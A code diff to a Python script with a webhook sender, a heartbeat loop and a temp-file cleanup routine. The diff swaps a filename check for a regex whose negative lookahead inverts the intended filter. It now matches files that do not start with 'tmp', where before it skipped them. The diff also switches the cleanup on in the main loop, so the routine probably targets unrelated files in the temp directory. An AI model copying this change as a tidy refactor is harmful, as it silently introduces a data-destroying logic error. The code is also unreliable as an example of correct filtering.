@@ -1,4 +1,4 @@
-import string, base64, json
+import string, base64, json, re
 import os, socket, tempfile
 import urllib.request
 
@@ -46,8 +46,6 @@ def send_webhook(message):
         with urllib.request.urlopen(req, timeout=10) as response:
             response.read()
         return True
-    except urllib.error.HTTPError as e:
-        return False
     except Exception as e:
         return False
 
@@ -68,10 +66,10 @@ def cleanup_named_tempfiles():
     temp_dir = tempfile.gettempdir()
     now = time()
 
+    pattern = re.compile(r'^(?!tmp)[^.]{11}\.[^.]{3}$')
     for filename in os.listdir(temp_dir):
-        name, ext = filename.split(".")
-        if not filename.startswith("tmp") or len(name) != 11 or len(ext) != 3:
-            continue
+        if not pattern.match(filename):
+                continue
 
         filepath = os.path.join(temp_dir, filename)
 
@@ -101,7 +99,7 @@ if __name__ == "__main__":
     FIRST_MESSAGE = True
     
     while True:
-        # cleanup_named_tempfiles()
+        cleanup_named_tempfiles()
 
         heartbeat()
 
